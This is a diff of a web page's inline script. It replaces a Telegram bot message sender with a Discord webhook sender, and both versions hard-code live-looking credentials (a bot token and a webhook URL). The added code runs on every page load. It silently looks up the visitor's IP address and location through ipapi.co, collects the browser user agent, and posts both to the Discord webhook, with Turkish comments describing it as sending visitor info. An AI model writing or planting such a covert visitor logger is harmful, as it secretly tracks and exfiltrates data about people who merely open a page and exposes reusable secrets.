@@ -150,49 +150,47 @@
 
 
     <script>
-        async function sendTelegramMessage(message) {
-  const BOT_TOKEN = '7655325430:AAFJhq850qEMaII4ObVfKDRv-Hso1nSyKXQ';
-  const CHAT_ID = '1566450486';
+        async function sendDiscordMessage(message) {
+  const webhookUrl = 'https://discord.com/api/webhooks/1375534402389413888/wfcYejfEJTgGFMR1hcxjfKwwMwn-hPriJ6Crmk0O6h_OrpXvnL2HMHAzNhy74HqrUhoW';
 
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-  const data = {
-    chat_id: CHAT_ID,
-    text: message
+  const payload = {
+    content: message
   };
 
   try {
-    const response = await fetch(url, {
+    const res = await fetch(webhookUrl, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
       },
-      body: JSON.stringify(data)
+      body: JSON.stringify(payload)
     });
-    if (!response.ok) {
-      throw new Error('Telegram API error');
+
+    if (!res.ok) {
+      throw new Error(`Discord API error: ${res.status}`);
     }
-    console.log('Mesage sent!');
-  } catch (error) {
-    console.error('Telegram error:', error);
+    console.log('Discord mesajı gönderildi!');
+  } catch (err) {
+    console.error('Discord mesaj gönderme hatası:', err);
   }
 }
 
+// Sayfa yüklendiğinde ziyaretçi bilgisi gönder
 window.addEventListener('load', async () => {
   const res = await fetch('https://ipapi.co/json/');
   const visitor = await res.json();
   const deviceInfo = navigator.userAgent;
 
   const message = `
-Datas:
+Yeni ziyaretçi bilgileri:
 IP: ${visitor.ip}
-City: ${visitor.city}
-Region: ${visitor.region}
-Country: ${visitor.country_name}
-Device: ${deviceInfo}
+Şehir: ${visitor.city}
+Bölge: ${visitor.region}
+Ülke: ${visitor.country_name}
+Cihaz: ${deviceInfo.substring(0, 100)}
   `;
 
-  sendTelegramMessage(message);
+  sendDiscordMessage(message);
 });
 
     </script>
